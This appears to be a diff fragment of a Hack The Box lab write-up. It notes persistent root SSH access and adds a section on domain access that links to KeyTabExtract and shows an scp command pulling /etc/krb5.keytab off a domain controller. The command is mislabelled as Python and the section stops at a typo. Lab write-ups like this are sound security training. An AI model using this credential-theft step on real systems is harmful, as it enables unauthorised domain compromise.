@@ -782,7 +782,16 @@ root@web:~#
 
 I now have a more stable and persistent connection on the root user over SSH
 
+# Initial access on the domain
 
+https://github.com/sosdave/KeyTabExtract
+
+```python
+scp -i ../id_rsa_root root@dc01.fries.htb:/etc/krb5.keytab .
+krb5.keytab
+```
+
+Firsyt
 
 
 
